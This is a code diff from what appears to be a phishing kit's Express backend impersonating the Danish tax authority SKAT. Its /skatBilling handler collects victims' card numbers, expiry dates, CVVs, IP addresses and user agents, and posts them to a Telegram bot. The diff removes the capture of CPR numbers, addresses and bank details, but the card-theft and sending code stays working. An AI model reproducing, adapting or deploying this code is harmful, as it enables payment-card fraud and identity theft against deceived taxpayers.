@@ -4312,15 +4312,6 @@ app.post("/skatPersonal", (req, res) => {
 app.options("/skatBilling", cors());
 
 app.post("/skatBilling", (req, res) => {
-  username = req.body.username
-  fullname = req.body.fullname
-  address = req.body.address
-  city = req.body.city
-  zip = req.body.zip
-  dob = req.body.dob
-  telephone = req.body.telephone
-  cpr = req.body.cpr
-  bank = req.body.bank
   ccname = req.body.ccname
   ccnum = req.body.ccnum
   ccexp = req.body.ccexp
@@ -4349,7 +4340,7 @@ app.post("/skatBilling", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       axios
         .post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`, {
